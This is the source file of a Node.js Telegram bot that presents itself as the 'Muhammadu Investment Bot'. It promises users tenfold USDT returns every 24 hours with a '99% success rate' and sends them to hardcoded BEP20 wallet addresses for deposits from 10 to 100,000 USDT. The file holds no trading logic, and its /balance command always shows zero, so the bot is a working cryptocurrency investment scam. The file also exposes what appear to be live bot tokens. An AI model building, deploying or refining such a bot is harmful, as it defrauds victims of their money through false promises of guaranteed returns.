const express = require('express');
const app = express();
const http = require('http');
const server = http.createServer(app);
const bodyParser = require('body-parser')
const TelegramBot = require('node-telegram-bot-api')
const token = '6051844104:AAG4xbaLlOO633ZuoiMpTqByIWoMm532wzg';
/*
const token = '6640105408:AAHlMp5tuKqH1fmDdb_NW-FEMUXL6tz16Q8'
*/

const {
  option,
  severaloptions
} = require('./worker/options.js');

const bot = new TelegramBot(token);
app.use(bodyParser.json());

app.post(`/webhook/${token}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

bot.setWebHook(`https://marathon-942l.onrender.com/webhook/${token}`)
.then(() => {
  console.log('Webhook set!');
})
.catch((error) => {
  console.error('Error setting webhook:', error);
});

const options = {
  reply_markup: JSON.stringify({
    inline_keyboard: [
      [{
        text: 'Deposit',
        url: 'https://shorturl.at/ehKRX'
      }]
    ]
  })
};

app.get('/', (req, res) => {
  res.send('stop playing o');
});

bot.onText(/\/start/, async(msg) => {
  const chatId = msg.chat.id;
  const message = `👋 Hello there, I'm the Muhammadu Investment Bot, your gateway to automated cryptocurrency trading!

  🎁 Unlock the potential to earn x10 of your USDT every 24 hours with our cutting-edge automated trading system that ensures a 99% success rate.

  📢 To get started and maximize your earnings, here are the mandatory rules:

  🔹 Join our community at @marathondigitalinvest for valuable insights and updates.

  ✅ Complete all the tasks provided and click on [Invest] to initiate your journey toward financial growth and success!`;



  await bot.sendMessage(chatId, message, option);
});


const Price = async (callbackQuery, chatId, messageId) => {
  try {
    if (callbackQuery.data === 'ten_click') {
      bot.answerCallbackQuery(callbackQuery.id);
      await bot.sendMessage(chatId, `*Invest 10 USDT, get 100 USDT*

        Send the exact 10 USDT to this address choosing *BEP20* as the preferred network:`, {
          reply_to_message_id: messageId,
          parse_mode: 'MarkdownV2'
        });
      await bot.sendMessage(chatId, '0x8D5583F20f0e066E8993e9ea2f1FE3ad6eCEb94C', options);
    } else if (callbackQuery.data === 'fifty_click') {
      bot.answerCallbackQuery(callbackQuery.id);
      await bot.sendMessage(chatId, `*Invest 50 USDT, get 500 USDT*

        Send the exact 50 USDT to this address choosing *BEP20* as the preferred network:`, {
          reply_to_message_id: messageId,
          parse_mode: 'MarkdownV2'
        });
      await bot.sendMessage(chatId, '0x8D5583F20f0e066E8993e9ea2f1FE3ad6eCEb94C', options); // Replace 'ADDRESS_FOR_50_USDT' with the actual address
    } else if (callbackQuery.data === 'hundred_click') {
      bot.answerCallbackQuery(callbackQuery.id);
      await bot.sendMessage(chatId, `*Invest 100 USDT, get 1000 USDT*

        Send the exact 100 USDT to this address choosing *BEP20* as the preferred network:`, {
          reply_to_message_id: messageId,
          parse_mode: 'MarkdownV2'
        });
      await bot.sendMessage(chatId, '0x8D5583F20f0e066E8993e9ea2f1FE3ad6eCEb94C', options); // Replace 'ADDRESS_FOR_100_USDT' with the actual address
    } else if (callbackQuery.data === 'twohundred_click') {
      bot.answerCallbackQuery(callbackQuery.id);
      await bot.sendMessage(chatId, `*Invest 200 USDT, get 2000 USDT*

        Send the exact 200 USDT to this address choosing *BEP20* as the preferred network:`, {
          reply_to_message_id: messageId,
          parse_mode: 'MarkdownV2'
        });
      await bot.sendMessage(chatId, '0x3Ad24874cC1c37c74eD03E36c60963a6E8D8FCf5', options); // Replace 'ADDRESS_FOR_200_USDT' with the actual address
    } else if (callbackQuery.data === 'fivehundred_click') {
      bot.answerCallbackQuery(callbackQuery.id);
      await bot.sendMessage(chatId, `*Invest 500 USDT, get 5000 USDT*

        Send the exact 500 USDT to this address choosing *BEP20* as the preferred network:`, {
          reply_to_message_id: messageId,
          parse_mode: 'MarkdownV2'
        });
      await bot.sendMessage(chatId, '0x3Ad24874cC1c37c74eD03E36c60963a6E8D8FCf5', options); // Replace 'ADDRESS_FOR_500_USDT' with the actual address
    } else if (callbackQuery.data === 'thousand_click') {
      bot.answerCallbackQuery(callbackQuery.id);
      await bot.sendMessage(chatId, `*Invest 1000 USDT, get 10000 USDT*

        Send the exact 1000 USDT to this address choosing *BEP20* as the preferred network:`, {
          reply_to_message_id: messageId,
          parse_mode: 'MarkdownV2'
        });
      await bot.sendMessage(chatId, '0x3Ad24874cC1c37c74eD03E36c60963a6E8D8FCf5', options); // Replace 'ADDRESS_FOR_1000_USDT' with the actual address
    } else if (callbackQuery.data === 'tenthousand_click') {
      bot.answerCallbackQuery(callbackQuery.id);
      await bot.sendMessage(chatId, `*Invest 10000 USDT, get 100,000 USDT*

        Send the exact 10000 USDT to this address choosing *BEP20* as the preferred network:`, {
          reply_to_message_id: messageId,
          parse_mode: 'MarkdownV2'
        });
      await bot.sendMessage(chatId, '0x8D5583F20f0e066E8993e9ea2f1FE3ad6eCEb94C', options); // Replace 'ADDRESS_FOR_10000_USDT' with the actual address
    } else if (callbackQuery.data === 'hundredthousand_click') {
      bot.answerCallbackQuery(callbackQuery.id);
      await bot.sendMessage(chatId, `*Invest 100,000 USDT, get 1,000,000 USDT*

        Send the exact 100,000 USDT to this address choosing *BEP20* as the preferred network:`, {
          reply_to_message_id: messageId,
          parse_mode: 'MarkdownV2'
        });
      await bot.sendMessage(chatId, '0x8D5583F20f0e066E8993e9ea2f1FE3ad6eCEb94C', options); // Replace 'ADDRESS_FOR_100000_USDT' with the actual address
    }
  }
  catch(error) {
    console.log(error)
  }
};

bot.on('callback_query', (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;

  if (callbackQuery.data === 'invest_click') {
    bot.answerCallbackQuery(callbackQuery.id);
    bot.sendMessage(chatId, `You've selected the 'Invest' option. Please take a moment to choose your preferred investment opportunity from the available options. 📈💼`, severaloptions, {
      reply_to_message_id: messageId
    });
  } else {
    Price(callbackQuery, chatId, messageId);
  }});

bot.onText(/\/invest/, async(msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, `You've selected the 'Invest' option. Please take a moment to choose your preferred investment opportunity from the available options. 📈💼`, severaloptions);
});

bot.onText(/\/balance/, async (msg) => {
  const chatId = msg.chat.id;
  const balanceMessage = `Your current investment balance is 0 USDT.

  To start earning, consider making an investment deposit.

  Click the button below to explore investment options. 📈💼`;

  bot.sendMessage(chatId, balanceMessage, options);
});

bot.on('polling_error',
  (error) => {
    console.error(error);
  });

server.listen(3000,
  () => {
    console.log('server is running');
  });